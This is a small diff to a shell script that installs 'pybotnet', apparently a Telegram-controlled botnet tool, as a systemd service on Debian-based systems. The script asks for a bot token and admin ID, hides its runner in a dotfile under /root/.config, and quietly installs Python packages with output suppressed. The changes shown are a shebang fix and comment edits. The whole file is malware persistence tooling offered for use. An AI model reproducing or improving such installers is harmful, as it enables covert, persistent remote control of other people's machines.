@@ -1,6 +1,6 @@
 #!/bin/sh
 
-## add pybotnet to debian base linux systemd-service ##
+## add pybotnet to Debian base Linux systemd-service ##
 
 # -- HELP --:
 # - replace youre telegram_bot_token, admin_id and bot_name with your own
@@ -16,9 +16,9 @@ bot_name=example_name_pybotnet
 service_name=pybotnet
 runner="/root/.config/.$service_name.sh"
 
-
+# Create runner 
 tee<<EOF > $runner
-#!/bin/
+#!/bin/sh
 apt-get update > /dev/null 2>&1 &&
 apt-get install python3-pip -y -qq > /dev/null 2>&1 &&
 apt-get install python3-dev -y -qq > /dev/null 2>&1 &&
